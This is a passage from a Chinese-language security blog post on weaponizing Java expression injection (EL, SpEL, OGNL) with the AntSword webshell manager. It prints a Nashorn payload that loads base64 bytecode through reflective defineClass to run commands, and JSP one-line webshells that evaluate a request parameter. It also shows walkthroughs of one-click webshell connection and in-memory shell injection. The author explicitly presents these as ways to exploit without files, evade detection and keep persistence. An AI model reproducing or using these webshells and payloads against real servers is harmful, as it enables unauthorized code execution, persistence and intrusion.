</span></span><span class="line"><span class="cl">  <span class="n">importPackage</span><span class="p">(</span><span class="n">Packages</span><span class="p">.</span><span class="n">java</span><span class="p">.</span><span class="n">io</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">function</span> <span class="n">Base64DecodeToByte</span><span class="p">(</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">importPackage</span><span class="p">(</span><span class="n">Packages</span><span class="p">.</span><span class="n">sun</span><span class="p">.</span><span class="n">misc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">importPackage</span><span class="p">(</span><span class="n">Packages</span><span class="p">.</span><span class="n">java</span><span class="p">.</span><span class="n">util</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">var</span> <span class="n">bt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">bt</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BASE64Decoder</span><span class="p">().</span><span class="n">decodeBuffer</span><span class="p">(</span><span class="n">str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">bt</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Base64</span><span class="p">().</span><span class="n">getDecoder</span><span class="p">().</span><span class="n">decode</span><span class="p">(</span><span class="n">str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">bt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">function</span> <span class="n">define</span><span class="p">(</span><span class="n">Classdata</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">var</span> <span class="n">classBytes</span> <span class="p">=</span> <span class="n">Base64DecodeToByte</span><span class="p">(</span><span class="n">Classdata</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">var</span> <span class="n">byteArray</span> <span class="p">=</span> <span class="n">Java</span><span class="p">.</span><span class="n">type</span><span class="p">(</span><span class="s">&#34;byte[]&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">var</span> <span class="kt">int</span> <span class="p">=</span> <span class="n">Java</span><span class="p">.</span><span class="n">type</span><span class="p">(</span><span class="s">&#34;int&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">var</span> <span class="n">defineClassMethod</span> <span class="p">=</span> <span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="n">ClassLoader</span><span class="p">.</span><span class="n">class</span><span class="p">.</span><span class="n">getDeclaredMethod</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">      <span class="s">&#34;defineClass&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">byteArray</span><span class="p">.</span><span class="n">class</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="kt">int</span><span class="p">.</span><span class="n">class</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="kt">int</span><span class="p">.</span><span class="k">class</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">defineClassMethod</span><span class="p">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">var</span> <span class="n">cc</span> <span class="p">=</span> <span class="n">defineClassMethod</span><span class="p">.</span><span class="n">invoke</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">      <span class="n">Thread</span><span class="p">.</span><span class="n">currentThread</span><span class="p">().</span><span class="n">getContextClassLoader</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">      <span class="n">classBytes</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="m">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">classBytes</span><span class="p">.</span><span class="n">length</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">cc</span><span class="p">.</span><span class="n">getConstructor</span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="n">String</span><span class="p">.</span><span class="n">class</span><span class="p">).</span><span class="n">newInstance</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>  
</span></span><span class="line"><span class="cl">  <span class="n">define</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="s">&#34;yv66vgAAADQAKQoABwAZCgAaABsKABoAHAcAHQoABAAeBwAfBwAgAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAGTGNhbGM7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAHwcAIQcAHQEAClNvdXJjZUZpbGUBAAljYWxjLmphdmEMAAgAIgcAIwwAJAAlDAAmACcBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAoACIBAARjYWxjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBAAMoKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABgAHAAAAAAABAAEACAAJAAEACgAAAIgAAgADAAAAFSq3AAG4AAIrtgADV6cACE0stgAFsQABAAQADAAPAAQAAwALAAAAGgAGAAAABAAEAAYADAAJAA8ABwAQAAgAFAAKAAwAAAAgAAMAEAAEAA0ADgACAAAAFQAPABAAAAAAABUAEQASAAEAEwAAABMAAv8ADwACBwAUBwAVAAEHABYEAAEAFwAAAAIAGA==&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="s">&#34;calc&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647673414014-f2625ee8-94c3-49b5-90c3-142c0fccc50c.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647673414014-f2625ee8-94c3-49b5-90c3-142c0fccc50c.png">
        <img
            
            loading="lazy"
            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647673414014-f2625ee8-94c3-49b5-90c3-142c0fccc50c.png"
            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647673414014-f2625ee8-94c3-49b5-90c3-142c0fccc50c.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1647673414014-f2625ee8-94c3-49b5-90c3-142c0fccc50c.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1647673414014-f2625ee8-94c3-49b5-90c3-142c0fccc50c.png 2x"
            sizes="auto"
            alt="img">
    </a></figure></p>
<p>其中字节码部分可以换为注入内存马的payload等等。</p>
<h2 id="蚁剑改造之一键连接" class="headerLink">
    <a href="#%e8%9a%81%e5%89%91%e6%94%b9%e9%80%a0%e4%b9%8b%e4%b8%80%e9%94%ae%e8%bf%9e%e6%8e%a5" class="header-mark"></a>5 蚁剑改造之一键连接</h2><h3 id="改造内容" class="headerLink">
    <a href="#%e6%94%b9%e9%80%a0%e5%86%85%e5%ae%b9" class="header-mark"></a>5.1 改造内容</h3><p>之前的jspjs类型必须要在上下文中绑定request跟response对象。但是在Spel跟ognl大多数情况下无法直接获取到这两个对象。于是便对jspjs类型进行了一些改动：</p>
<p>1、取消对外部request跟response的依赖。</p>
<p>2、以编码器的形式内置了利用的payload。</p>
<p>具体commit可以看：</p>
<p><a href="https://github.com/AntSwordProject/antSword/commit/797562b417271480628aa469789582a932318e47" target="_blank" rel="noopener noreferrer">https://github.com/AntSwordProject/antSword/commit/797562b417271480628aa469789582a932318e47</a></p>
<p>原来的Shell必须要绑定request跟response对象</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="p">&lt;%</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">new</span> <span class="n">javax</span><span class="p">.</span><span class="n">script</span><span class="p">.</span><span class="n">ScriptEngineManager</span><span class="p">().</span><span class="n">getEngineByName</span><span class="p">(</span><span class="s">&#34;js&#34;</span><span class="p">).</span><span class="n">eval</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s">&#34;ant&#34;</span><span class="p">),</span> <span class="k">new</span> <span class="n">javax</span><span class="p">.</span><span class="n">script</span><span class="p">.</span><span class="n">SimpleBindings</span><span class="p">(</span><span class="k">new</span> <span class="n">java</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">HashMap</span><span class="p">()</span> <span class="p">{{</span>
</span></span><span class="line"><span class="cl">            <span class="n">put</span><span class="p">(</span><span class="s">&#34;response&#34;</span><span class="p">,</span> <span class="n">response</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">put</span><span class="p">(</span><span class="s">&#34;request&#34;</span><span class="p">,</span> <span class="n">request</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}}));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">%&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>经过改造后连绑定对象这一步也可以省去了，demo如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="p">&lt;%</span>
</span></span><span class="line"><span class="cl">    <span class="k">out</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="k">new</span> <span class="n">javax</span><span class="p">.</span><span class="n">script</span><span class="p">.</span><span class="n">ScriptEngineManager</span><span class="p">().</span><span class="n">getEngineByName</span><span class="p">(</span><span class="s">&#34;js&#34;</span><span class="p">).</span><span class="n">eval</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s">&#34;ant&#34;</span><span class="p">)));;</span>
</span></span><span class="line"><span class="cl"><span class="p">%&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>所以，<strong>现在不管是表达式还是什么场景，只要能够调用javax.script.ScriptEngineManager().getEngineByName(&ldquo;js&rdquo;).eval(xxx)这一句，理论上都可以用蚁剑进行无文件直接连接。</strong></p>
<p>当然，现在的Shell跟之前的Shell并不冲突，两种都可以使用。有条件的话还是尽量使用第一种，原因后面会讲到。</p>
<h3 id="el表达式" class="headerLink">
    <a href="#el%e8%a1%a8%e8%be%be%e5%bc%8f" class="header-mark"></a>5.2 EL表达式</h3><p>起一个Tomcat，el.jsp内容如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">&lt;%
</span></span><span class="line"><span class="cl">out.print(org.apache.jasper.runtime.PageContextImpl.proprietaryEvaluate(request.getParameter(&#34;ant&#34;), String.class, pageContext, null));
</span></span><span class="line"><span class="cl">%&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>打开蚁剑，选择el编码器，一键连接。</p>
<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650204007124-29629b79-8ea7-46c0-8be0-d0a1fbdc9e9a.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650204007124-29629b79-8ea7-46c0-8be0-d0a1fbdc9e9a.png">
        <img
            
            loading="lazy"
            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650204007124-29629b79-8ea7-46c0-8be0-d0a1fbdc9e9a.png"
            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650204007124-29629b79-8ea7-46c0-8be0-d0a1fbdc9e9a.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1650204007124-29629b79-8ea7-46c0-8be0-d0a1fbdc9e9a.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1650204007124-29629b79-8ea7-46c0-8be0-d0a1fbdc9e9a.png 2x"
            sizes="auto"
            alt="img">
    </a></figure></p>
<h3 id="spel表达式" class="headerLink">
    <a href="#spel%e8%a1%a8%e8%be%be%e5%bc%8f" class="header-mark"></a>5.3 Spel表达式</h3><p>springboot设置一个测试环境，以spel为例</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">  @RequestMapping(&#34;/spel&#34;)
</span></span><span class="line"><span class="cl">  public String eval(String spel){
</span></span><span class="line"><span class="cl">      SpelExpressionParser parser = new SpelExpressionParser();
</span></span><span class="line"><span class="cl">      Expression expression = parser.parseExpression(spel);
</span></span><span class="line"><span class="cl">      return expression.getValue().toString();
</span></span><span class="line"><span class="cl">  }
</span></span></code></pre></td></tr></table>
</div>
</div><p>蚁剑选择spelbase64编码器可一键连接</p>
<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650202550917-c28a3edf-1397-4c23-a9a5-312c9b25a0a2.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650202550917-c28a3edf-1397-4c23-a9a5-312c9b25a0a2.png">
        <img
            
            loading="lazy"
            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650202550917-c28a3edf-1397-4c23-a9a5-312c9b25a0a2.png"
            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650202550917-c28a3edf-1397-4c23-a9a5-312c9b25a0a2.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1650202550917-c28a3edf-1397-4c23-a9a5-312c9b25a0a2.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1650202550917-c28a3edf-1397-4c23-a9a5-312c9b25a0a2.png 2x"
            sizes="auto"
            alt="img">
    </a></figure></p>
<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650202560176-12bb2107-0e4b-4549-920a-a674a8f0dcfc.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650202560176-12bb2107-0e4b-4549-920a-a674a8f0dcfc.png">
        <img
            
            loading="lazy"
            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650202560176-12bb2107-0e4b-4549-920a-a674a8f0dcfc.png"
            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650202560176-12bb2107-0e4b-4549-920a-a674a8f0dcfc.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1650202560176-12bb2107-0e4b-4549-920a-a674a8f0dcfc.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1650202560176-12bb2107-0e4b-4549-920a-a674a8f0dcfc.png 2x"
            sizes="auto"
            alt="img">
    </a></figure></p>
<p>至于为什么要加一层base64是因为发现如果直接发送的话，两个引号会被nashorn引擎吃掉成一个，然后报错。</p>
<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1649491303833-ac77ec14-6978-4b90-894f-14027c5c5dc4.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1649491303833-ac77ec14-6978-4b90-894f-14027c5c5dc4.png">
        <img
            
            loading="lazy"
            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1649491303833-ac77ec14-6978-4b90-894f-14027c5c5dc4.png"
            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1649491303833-ac77ec14-6978-4b90-894f-14027c5c5dc4.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1649491303833-ac77ec14-6978-4b90-894f-14027c5c5dc4.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1649491303833-ac77ec14-6978-4b90-894f-14027c5c5dc4.png 2x"
            sizes="auto"
            alt="img">
    </a></figure></p>
<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1649491280338-b7b97576-14f1-4f9a-9fa8-638119012622.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1649491280338-b7b97576-14f1-4f9a-9fa8-638119012622.png">
        <img
            
            loading="lazy"
            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1649491280338-b7b97576-14f1-4f9a-9fa8-638119012622.png"
            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1649491280338-b7b97576-14f1-4f9a-9fa8-638119012622.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1649491280338-b7b97576-14f1-4f9a-9fa8-638119012622.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1649491280338-b7b97576-14f1-4f9a-9fa8-638119012622.png 2x"
            sizes="auto"
            alt="img">
    </a></figure></p>
<h3 id="ognl表达式" class="headerLink">
    <a href="#ognl%e8%a1%a8%e8%be%be%e5%bc%8f" class="header-mark"></a>5.4 Ognl表达式</h3><p>以ognl为例</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">  @RequestMapping(&#34;/ognl&#34;)
</span></span><span class="line"><span class="cl">  public String eval(String str) throws Exception {
</span></span><span class="line"><span class="cl">      OgnlContext context = new OgnlContext();
</span></span><span class="line"><span class="cl">      Object ognl = Ognl.parseExpression(str);
</span></span><span class="line"><span class="cl">      Object value = Ognl.getValue(ognl, context, context.getRoot());
</span></span><span class="line"><span class="cl">      return value.toString();
</span></span><span class="line"><span class="cl">  }
</span></span></code></pre></td></tr></table>
</div>
</div><p>选择ognl编码器，一键连接</p>
<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650202584299-70458fcd-b3cd-436d-9273-e735a1304ee5.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650202584299-70458fcd-b3cd-436d-9273-e735a1304ee5.png">
        <img
            
            loading="lazy"
            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650202584299-70458fcd-b3cd-436d-9273-e735a1304ee5.png"
            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650202584299-70458fcd-b3cd-436d-9273-e735a1304ee5.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1650202584299-70458fcd-b3cd-436d-9273-e735a1304ee5.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1650202584299-70458fcd-b3cd-436d-9273-e735a1304ee5.png 2x"
            sizes="auto"
            alt="img">
    </a></figure></p>
<h2 id="as-exploits一键连接" class="headerLink">
    <a href="#as-exploits%e4%b8%80%e9%94%ae%e8%bf%9e%e6%8e%a5" class="header-mark"></a>6 As-Exploits一键连接</h2><p>As-Exploits是蚁剑的后渗透模块，支持一键反弹Shell，一键注入内存马，一键加载ShellCode等操作。</p>
<p>在1.5版本中，增加了对jspjs类型的支持。</p>
<p>因为As-Exploits中jspjs的payload实际上是对jsp的payload又包了一层，而jsp的payload是硬编码了必须要依赖request跟response，所以如果想在表达式环境下使用，要先绑定request跟response对象，也就是第一种Shell的写法。</p>
<p>另外由于jdk6/7下的Rhino引擎过于傻逼，搞了一晚上解决了各种坑之后发现还是无法直接获取到Object.class(<a href="https://github.com/mozilla/rhino/issues/757" target="_blank" rel="noopener noreferrer">https://github.com/mozilla/rhino/issues/757</a>)，所以在Rhino引擎下如何在js里调用defineClass还没有实现，如果有搞出来的师傅可以教教我。</p>
<p>基本信息模块</p>
<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650200212790-77e3eccb-e66b-4d3d-a792-9ef74f75fdb5.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650200212790-77e3eccb-e66b-4d3d-a792-9ef74f75fdb5.png">
        <img
            
            loading="lazy"
            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650200212790-77e3eccb-e66b-4d3d-a792-9ef74f75fdb5.png"
            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650200212790-77e3eccb-e66b-4d3d-a792-9ef74f75fdb5.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1650200212790-77e3eccb-e66b-4d3d-a792-9ef74f75fdb5.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1650200212790-77e3eccb-e66b-4d3d-a792-9ef74f75fdb5.png 2x"
            sizes="auto"
            alt="img">
    </a></figure></p>
<p>内存马管理模块</p>
<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650201478364-2adffaf8-64af-4352-88a1-adabd1869729.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650201478364-2adffaf8-64af-4352-88a1-adabd1869729.png">
        <img
            
            loading="lazy"
            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650201478364-2adffaf8-64af-4352-88a1-adabd1869729.png"
            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650201478364-2adffaf8-64af-4352-88a1-adabd1869729.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1650201478364-2adffaf8-64af-4352-88a1-adabd1869729.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1650201478364-2adffaf8-64af-4352-88a1-adabd1869729.png 2x"
            sizes="auto"
            alt="img">
    </a></figure></p>
<p>测试一下内存马注入功能，打进去一个antSword的filter。执行，提示成功</p>
<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650201536272-f94c3f52-3cef-4d47-a322-c2aaed41124c.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650201536272-f94c3f52-3cef-4d47-a322-c2aaed41124c.png">
        <img
            
            loading="lazy"
            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650201536272-f94c3f52-3cef-4d47-a322-c2aaed41124c.png"
            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650201536272-f94c3f52-3cef-4d47-a322-c2aaed41124c.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1650201536272-f94c3f52-3cef-4d47-a322-c2aaed41124c.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1650201536272-f94c3f52-3cef-4d47-a322-c2aaed41124c.png 2x"
            sizes="auto"
            alt="img">
    </a></figure></p>
<p>去内存马管理模块里看一下，发现已经注入成功</p>
<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650201559354-02735831-d8fc-4f95-8003-58374c319a31.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650201559354-02735831-d8fc-4f95-8003-58374c319a31.png">
        <img
            
            loading="lazy"
            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650201559354-02735831-d8fc-4f95-8003-58374c319a31.png"
            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650201559354-02735831-d8fc-4f95-8003-58374c319a31.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1650201559354-02735831-d8fc-4f95-8003-58374c319a31.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1650201559354-02735831-d8fc-4f95-8003-58374c319a31.png 2x"
            sizes="auto"
            alt="img">
    </a></figure></p>
<p>通过蚁剑就可以连接我们注入的内存马了。</p>
<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650201587727-8b077f03-6558-43e1-8d3d-dd9aa7401ec1.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650201587727-8b077f03-6558-43e1-8d3d-dd9aa7401ec1.png">
        <img
            
            loading="lazy"
            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650201587727-8b077f03-6558-43e1-8d3d-dd9aa7401ec1.png"
            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1650201587727-8b077f03-6558-43e1-8d3d-dd9aa7401ec1.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1650201587727-8b077f03-6558-43e1-8d3d-dd9aa7401ec1.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1650201587727-8b077f03-6558-43e1-8d3d-dd9aa7401ec1.png 2x"
            sizes="auto"
            alt="img">
    </a></figure></p>
<h2 id="最后" class="headerLink">
    <a href="#%e6%9c%80%e5%90%8e" class="header-mark"></a>7 最后</h2><p>借助蚁剑，我们基本做到了对表达式注入的武器化利用。这样主要有3个作用：</p>
<ol>
<li>
<p>漏洞的无文件利用。蚁剑的编码器其实有点类似于profile，可以自定义各种请求参数。根据不同场景自己改一改payload，即可达到对指定漏洞的无文件利用效果。本文不涉及具体漏洞的利用，感兴趣的同学可以自己研究。</p>
</li>
<li>
<p>表达式下的任意代码执行。原来的表达式注入大多是直接执行命令，属于命令执行层面很容易检测，懂得都懂。</p>
</li>
<li>
<p>构造webshell维权。原来jsp webshell主要局限在defineClass，现在可以通过各种表达式来构造webshell了，格局打开。</p>
</li>
</ol>
<h2 id="参考" class="headerLink">
    <a href="#%e5%8f%82%e8%80%83" class="header-mark"></a>8 参考</h2><p><a href="https://paper.seebug.org/794/" target="_blank" rel="noopener noreferrer">https://paper.seebug.org/794/</a></p>
<p><a href="https://xz.aliyun.com/t/9245" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/t/9245</a></p>
<p><a href="http://yzddmr6.com/posts/%e4%b8%80%e7%a7%8d%e6%96%b0%e5%9e%8bJava%e4%b8%80%e5%8f%a5%e8%af%9d%e6%9c%a8%e9%a9%ac%e7%9a%84%e5%ae%9e%e7%8e%b0/" target="_blank" rel="noopener noreferrer">http://yzddmr6.com/posts/%E4%B8%80%E7%A7%8D%E6%96%B0%E5%9E%8BJava%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%AE%9E%E7%8E%B0/</a></p>
</div>

        

<div class="sponsor">
        <div class="sponsor-avatar"><img
        
        loading="lazy"
        src="/images/avatar.webp"
        srcset="/images/avatar.webp, /images/avatar.webp 1.5x, /images/avatar.webp 2x"
        sizes="auto"
        alt="/images/avatar.webp"
        title="/images/avatar.webp" height="640"   width="640" ></div><p class="sponsor-bio"><em>欢迎加入我的知识星球，共同交流网络安全技术~</em></p><div class="sponsor-custom"><a href="https://t.zsxq.com/FA6urjI" target="_blank"><img src="/zsxq.png" alt="网络安全回收站" style="width:50%;display:inline-block;" ></a></div></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>更新于 2022-06-11</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share"><button title="分享到 Twitter" data-sharer="twitter" data-url="https://yzddmr6.com/posts/java-expression-exploit/" data-title="Java表达式注入的武器化利用"><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer="facebook" data-url="https://yzddmr6.com/posts/java-expression-exploit/"><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 Hacker News" data-sharer="hackernews" data-url="https://yzddmr6.com/posts/java-expression-exploit/" data-title="Java表达式注入的武器化利用"><span class="fab fa-hacker-news fa-fw"></span></button><button title="分享到 Line" data-sharer="line" data-url="https://yzddmr6.com/posts/java-expression-exploit/" data-title="Java表达式注入的武器化利用"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="分享到 微博" data-sharer="weibo" data-url="https://yzddmr6.com/posts/java-expression-exploit/" data-title="Java表达式注入的武器化利用"><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Telegram" data-sharer="telegram" data-url="https://yzddmr6.com/posts/java-expression-exploit/" data-title="Java表达式注入的武器化利用" data-web><span class="fab 